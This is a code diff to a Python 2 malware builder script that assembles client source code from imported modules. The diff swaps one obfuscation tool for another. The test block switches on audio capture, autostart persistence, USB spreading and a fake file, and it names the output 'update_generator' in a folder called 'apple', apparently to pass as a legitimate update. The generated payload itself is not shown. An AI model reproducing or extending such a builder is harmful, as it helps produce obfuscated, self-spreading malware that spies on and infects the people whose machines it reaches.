@@ -2,13 +2,7 @@ __author__ = 'Uri Patton'
 
 import client_source
 import client_snippets
-import subprocess
-import sys
-import os
-
-executable = sys.executable
-script = os.path.join(os.getcwd(), 'pyminifier', '__main__.py')
-
+import pyobfuscator
 
 class SourceGenerator:
 
@@ -26,13 +20,13 @@ class SourceGenerator:
     def __init__(self):
         pass
 
-    def generate_source(self):
+    def generate_source(self, path):
+        print self.filename
         self.source = client_source.source
-        with open('source.py', 'w') as source:
-            source.write(self.format_source(self.source))
-        output = subprocess.Popen([executable, script, "--obfuscate", "source.py"], stdout=subprocess.PIPE).communicate()[0]
-        print output
-
+        source_file = open(path, 'w')
+        source_file.write(self.format_source(self.source))
+        source_file.close()
+        self.generated_source_file = path
 
     def generate_snippets(self):
         return {
@@ -88,6 +82,9 @@ class SourceGenerator:
         snippets = self.generate_snippets()
         return reduce(lambda x, y: x.replace(y, snippets[y]), snippets, source)
 
+    def obfuscate(self, __path):
+        pyobfuscator.main(__path)
+
 
 # Tests
 a = SourceGenerator()
@@ -95,4 +92,7 @@ a.use_audio(True)
 a.use_autostart(True)
 a.use_usb_spreading(True)
 a.use_fake_file(True)
-a.generate_source()
+a.set_working_dir_name('apple')
+a.set_file_name('update_generator')
+a.generate_source('source2.py')
+a.obfuscate(a.generated_source_file)
